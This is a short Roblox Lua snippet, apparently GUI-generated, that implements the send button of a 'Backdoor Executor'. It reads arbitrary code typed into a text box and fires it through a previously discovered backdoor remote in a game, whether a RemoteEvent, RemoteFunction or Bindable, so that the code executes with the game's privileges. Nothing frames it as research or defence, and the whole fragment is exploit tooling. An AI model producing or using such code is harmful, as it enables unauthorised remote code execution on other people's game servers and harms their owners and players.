local function C_b()
local script = G2L["b"];
	local b=script.Parent
	local stgui=game:GetService("StarterGui")

	b.MouseButton1Click:Connect(function()
		local code=script.Parent.Parent.TextBox.Text
		local backdoor=script.Parent.Parent.Parent.Backdoor.Value
		if backdoor:IsA("RemoteEvent") then
			backdoor:FireServer(code)
		elseif backdoor:IsA("RemoteFunction") then
			backdoor:InvokeServer(code)
		elseif backdoor:IsA("BindableEvent") then
			backdoor:Fire(code)
		elseif backdoor:IsA("BindableFunction") then
			backdoor:Invoke(code)
		elseif not backdoor then
			stgui:SetCore("SendNotification",{
				Title="Backdoor Executor",
				Text="No backdoor remote yet.",
				Duration=2
			})
		end
	end)
end;
